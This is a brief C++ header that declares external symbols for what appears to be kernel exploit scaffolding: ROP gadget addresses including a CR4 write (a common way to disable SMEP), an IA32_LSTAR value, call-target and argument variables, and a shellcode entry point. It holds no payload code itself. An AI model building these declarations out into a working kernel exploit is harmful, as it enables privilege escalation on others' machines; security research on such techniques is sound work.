#pragma once
#include <cstdint>

extern "C"
{
    extern std::uintptr_t POP_RCX_RET;
    extern std::uintptr_t MOV_CR4_RCX_RET;
    extern std::uintptr_t MOV_RAX_RCX_RET;
    extern std::uintptr_t SYSRETQ_RET;
    extern std::uintptr_t IA32_LSTAR;
    extern std::uintptr_t CallTargetFn;
    extern std::uint64_t  CallArgCount;
    extern std::uintptr_t CallArgsPtr;
    extern std::uint64_t  CallResult;
    extern std::uintptr_t ENTRY_GADGET;
    
    void shellcode_entry();
}
